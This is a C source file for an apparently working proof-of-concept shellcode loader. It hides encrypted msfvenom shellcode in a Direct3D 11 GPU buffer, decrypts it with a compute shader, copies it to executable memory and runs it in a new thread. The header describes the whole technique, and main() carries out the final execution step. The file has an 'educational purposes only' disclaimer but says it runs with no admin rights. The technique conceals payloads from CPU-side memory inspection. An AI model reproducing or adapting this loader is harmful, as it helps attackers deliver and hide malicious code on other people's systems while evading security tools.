/*
Author: Blake Dietze
Github: IceCoaled
Date: 7/27/2024

Description: This program demonstrates how to use D3D11 to create a GPU buffer(VRAM) completely inaccessible by CPU . CPU buffer(VRAM), CPU buffer is only Accessable by the CPU once mapped.
The GPU buffer is used to store encrypted shellcode, and the CPU buffer is used to store the decrypted shellcode.
The program uses a compute shader to decrypt the shellcode inside the GPU, and then copies the decrypted shellcode to an executable buffer.
The program then executes the shellcode.

This program is for educational purposes only, and should not be used for malicious intent.
The shellcode used in this program is a simple calc shellcode generated by msfvenom.
'

The program uses the D3D11 API to create the buffers and the compute shader.
You Must Install Hlsl Tools for Visual Studio to compile the compute shader.

To Compile the Compute Shader:
1. Open the DecryptShader.hlsl file in Visual Studio
2. Right Click the File and Select Compile Shader

To Run the Program:
1. Simply Compile the Program, and Run the Executable.
No arguments, or admin rights are needed.

This Code is Provided As Is, and I am not responsible for any damage caused by this code.
It is your responsibility to use this code for educational purposes only.

This may not be the best code, but it is a POC of how to use D3D11 to create something special.
*/



#include "D3D11Functions.h"
#include "Utils.h"
#include <conio.h>


//Disable Optimization
//compiler keeps optimizing the code and removing hThread
#pragma optimize("", off) 

//Main Function
int main()
{
	//new D3D11 Data
	D3D11_DATA D3D11_DATA = { 0 };
	PVOID allocatedMem = NULL;
	
	//call initialization	
	HRESULT result = InitD3D11(&D3D11_DATA);
	if (FAILED(result))
	{
		printf_s("[-]Closing Program With Error : 0x%I32X \n", result);
		return -1;
	}
	else
	{
		printf_s("[+]D3D11 Device and Device Context Initialized\n");
		printf_s("[+]D3D11 Device Allocated At : 0x%I64X \n", &D3D11_DATA.device);
		printf_s("[+]Gpu Buffer Allocated At : 0x%I64X \n", &D3D11_DATA.gpuBuffer);
		printf_s("[+]Cpu Buffer Allocated At : 0x%I64X \n", &D3D11_DATA.cpuBuffer);
	}

#ifdef CHECK_CPU_ACCESS
	
	//Check if the CPU can access the buffer	
	if (!CheckForCpuAccess(&D3D11_DATA)) 
	{
		return -1;
	}

#endif // 

	printf_s("[+]Press Any Key to Decrypt Shellcode\n");
	_getch();

	//Decrypt the Shellcode via Compute Shader
	result = DecryptViaComputeShader(&D3D11_DATA);
	if (FAILED(result))
	{
		printf_s("[-]Closing Program With Error : 0x%I32X \n", result);
		D3D11Cleanup(&D3D11_DATA);
		return -1;
	}

	printf_s("[+]Shellcode Decrypted \r\n Press Any Key to Fetch Shellcode\n");
	_getch();

	
	//Copy the Shellcode from the GPU Buffer to the Staging Buffer
	result = AccessDataFromGpu(&D3D11_DATA, &allocatedMem);
	if (FAILED(result))
	{
		printf_s("[-]Closing Program With Error : 0x%I32X \n", result);
		D3D11Cleanup(&D3D11_DATA);
		return -1;
	}

	printf_s("[+]Press Any Key to Execute Shellcode\n");
	_getch();

	//Execute the Shellcode
	HANDLE hThread = CreateThread(NULL, 0, allocatedMem, NULL, NULL, NULL);

	//Wait for the thread to finish
	WaitForSingleObject(hThread, INFINITE);
		

	//Free the allocated memory
	VirtualFree(allocatedMem, 0, MEM_RELEASE);

	system("pause");
	
	printf_s("[+]Program Exited Successfully\n");
	return 0;
		
}
